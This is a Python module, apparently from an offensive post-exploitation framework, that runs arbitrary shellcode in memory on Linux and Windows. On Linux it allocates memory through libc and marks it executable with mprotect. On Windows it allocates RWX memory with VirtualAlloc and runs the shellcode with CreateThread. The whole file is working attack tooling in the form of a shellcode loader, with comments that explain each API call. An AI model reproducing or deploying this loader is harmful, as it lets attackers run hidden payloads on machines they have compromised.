'''

run: execute the shellcode on either windows or unix

'''

import os
import ctypes
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE

class module():

  def __init__(self, arg_list, dynamic_args):
    self.shellcode = arg_list[0]

  @staticmethod
  def info(info_req):
    information = {
      "name"        : "run",
      "description" : "Execute shellcode on either windows or unix",
      "arguments"   : True
    }

    return information[info_req]

  def do_thing(self):
    # Methods used are heavily inspired by the following:
    #   http://hacktracking.blogspot.com/2015/05/execute-shellcode-in-python.html
    #   http://www.debasish.in/2012/04/execute-shellcode-using-python.html
    sbytes = self.shellcode

    if os.name == 'posix':

      shellcode = bytes(sbytes[1])          # convert shellcode into a bytes
      libc = CDLL('libc.so.6')              # implement C functions (duh)
      sc = c_char_p(shellcode)              # character pointer (NUL terminated)
      size = len(shellcode)                 # size of the shellcode executing
      addr = c_void_p(libc.valloc(size))    # allocate bytes and return pointer to allocated memory
      memmove(addr, sc, size)               # copy bytes to allocated memory destination
      libc.mprotect(addr, size, 0x7)        # change access protections
      run = cast(addr, CFUNCTYPE(c_void_p)) # calling convention
      run()

    else:
      
      shellcode = bytearray(sbytes[1])

      # LPVOID WINAPI VirtualAlloc(
      #   __in_opt  LPVOID lpAddress,         // Address of the region to allocate. If this parameter is NULL, the system determines where to allocate the region.
      #   __in      SIZE_T dwSize,            // Size of the region in bytes. Here we put the size of the shellcode
      #   __in      DWORD flAllocationType,   // The type of memory allocation, flags 0x1000 (MEMCOMMIT) and 0x2000 (MEMRESERVE) to both reserve and commit memory
      #   __in      DWORD flProtect           // Enables RWX to the committed region of pages
      # );
      ptr = ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
      ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
        ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
      # BOOL WINAPI VirtualLock(
      #   _In_ LPVOID lpAddress,  // A pointer to the base address of the region of pages to be locked
      #   _In_ SIZE_T dwSize      // The size of the region to be locked, in bytes.
      # );
      buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
      # VOID RtlMoveMemory(
      #   _Out_       VOID UNALIGNED *Destination,    // A pointer to the destination memory block to copy the bytes to.
      #   _In_  const VOID UNALIGNED *Source,         // A pointer to the source memory block to copy the bytes from.
      #   _In_        SIZE_T         Length           // The number of bytes to copy from the source to the destination.
      # );
      ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr),
        buf, ctypes.c_int(len(shellcode)))
      # HANDLE WINAPI CreateThread(
      #   _In_opt_  LPSECURITY_ATTRIBUTES  lpThreadAttributes,    // If lpThreadAttributes is NULL, the thread gets a default security descriptor.
      #   _In_      SIZE_T                 dwStackSize,           // If this parameter is zero, the new thread uses the default size for the executable.
      #   _In_      LPTHREAD_START_ROUTINE lpStartAddress,        // A pointer to the application-defined function to be executed by the thread.
      #   _In_opt_  LPVOID                 lpParameter,           // optional (A pointer to a variable to be passed to the thread)
      #   _In_      DWORD                  dwCreationFlags,       // Run the thread immediately after creation.
      #   _Out_opt_ LPDWORD                lpThreadId             // NULL, so the thread identifier is not returned.
      # );
      ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
        ctypes.c_int(0), ctypes.c_void_p(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
      # Waits until the specified object is in the signaled state or the time-out interval elapses
      ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

    exit()
